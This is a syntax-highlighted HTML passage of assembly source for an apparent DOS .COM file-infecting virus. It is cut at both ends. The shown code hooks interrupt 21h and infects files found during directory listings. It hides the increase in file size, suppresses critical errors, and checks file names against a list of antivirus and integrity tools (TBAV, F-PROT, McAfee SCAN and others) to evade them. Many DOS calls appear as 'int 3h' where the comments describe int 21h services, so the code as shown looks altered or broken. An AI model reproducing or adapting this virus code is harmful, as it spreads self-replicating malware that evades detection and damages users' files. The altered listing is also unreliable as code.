        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
</span><span class="sc5">fix_attribs</span><span class="sc4">:</span><span class="sc0">                                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E00h</span><span class="sc0">             </span><span class="sc1">; close</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">             </span><span class="sc1">; Restore old attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">attrib</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_name</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; Leave this sub-routine</span><span class="sc0">

</span><span class="sc5">dir_handler_1</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">pushf</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">           </span><span class="sc1">; Call to</span><span class="sc0">
</span><span class="sc5">old_21h</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                 </span><span class="sc1">; old int 21 vector</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Find something?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_dir_1</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_dir_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; save registers.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; Get DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">; es:bx -&gt; DTA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; ds = es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; Extended FCB?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_extended</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_extended</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; restore es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">victim_name</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Dark Angel's code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; to turn FCB string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">                     </span><span class="sc1">; into an ASCIIZ string</span><span class="sc0">
</span><span class="sc5">space_finder</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">      </span><span class="sc1">; find the first space</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">space_found</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">space_finder</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">space_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; copy the period</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OC'</span><span class="sc0">             </span><span class="sc1">; test for (CO)M extention</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_com</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">              </span><span class="sc1">; Is it an CO(M)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_com</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; end of string byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                        </span><span class="sc1">; NULL for C people</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;  es = ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;  restore ds</span><span class="sc0">
        
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; es:di points to the DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">           </span><span class="sc1">; open read/only</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">victim_name</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                  </span><span class="sc1">; changes to r/w in the</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">not_com</span><span class="sc0">             </span><span class="sc1">; system file table</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infection_test</span><span class="sc0">             </span><span class="sc1">; is it infected?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCh</span><span class="sc0">                 </span><span class="sc1">; FFFF = infected</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">continue_dir</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; mark it read/only</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E00h</span><span class="sc0">                  </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; Save these</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDDDh</span><span class="sc0">                 </span><span class="sc1">; not infected, but</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_com</span><span class="sc0">                    </span><span class="sc1">; don't infect. IMPORTANT!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">29d</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0">                    </span><span class="sc1">; directory stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">29d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_com</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;  .         .         .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">;   .       . .       .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">;    .     .   .     .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">;     .   .     .   .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">;      . .       . .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;       .         . </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;      . .       . .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;     .   .     .   .</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;    .     .   .     .</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                 </span><span class="sc1">;   .       . .       .</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                 </span><span class="sc1">;  .         .         .</span><span class="sc0">
</span><span class="sc5">continue_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">             </span><span class="sc1">; Actually get around to infecting</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">             </span><span class="sc1">; the poor little file.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">infect_victim</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">not_com</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">new_24h</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Error (Mis)handler</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        
</span><span class="sc5">name_tester</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'MI'</span><span class="sc0">    </span><span class="sc1">;Integrity Master</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;*IM</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XR'</span><span class="sc0">    </span><span class="sc1">;*rx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'PO'</span><span class="sc0">    </span><span class="sc1">;*STOP</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next1</span><span class="sc0">                      </span><span class="sc1">;(VIRSTOP)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'TS'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0">    </span><span class="sc1">;*AV  i.e. cpav</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;(TBAV) (MSAV)  </span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'TO'</span><span class="sc0">    </span><span class="sc1">;*prot  f-prot</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next2</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'RP'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next2</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">AV</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">; must be equal</span><span class="sc0">

</span><span class="sc5">next2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*scan  McAffee's </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                      </span><span class="sc1">;(TBSCAN)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*lean  CLEAN..</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                      </span><span class="sc1">; why not eh?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">    </span><span class="sc1">;(TBCLEAN)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">next3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'CV'</span><span class="sc0">    </span><span class="sc1">; Victor Charlie</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">; default  *VC</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'KC'</span><span class="sc0">    </span><span class="sc1">; VCHECK</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next4</span><span class="sc0">                      </span><span class="sc1">; (Victor Charlie)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EH'</span><span class="sc0">    </span><span class="sc1">; (TBCHECK) *HECK</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next4</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'ME'</span><span class="sc0">    </span><span class="sc1">; TBMEM</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next5</span><span class="sc0">                      </span><span class="sc1">; *BMEM</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'MB'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next5</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XN'</span><span class="sc0">    </span><span class="sc1">; TBSCANX</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next6</span><span class="sc0">                      </span><span class="sc1">; *CANX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'AC'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next6</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">    </span><span class="sc1">; TBFILE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next7</span><span class="sc0">                      </span><span class="sc1">; *FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'IF'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next7</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'KS'</span><span class="sc0">    </span><span class="sc1">; CHKDSK</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next8</span><span class="sc0">                      </span><span class="sc1">; *KDSK</span><span class="sc0">
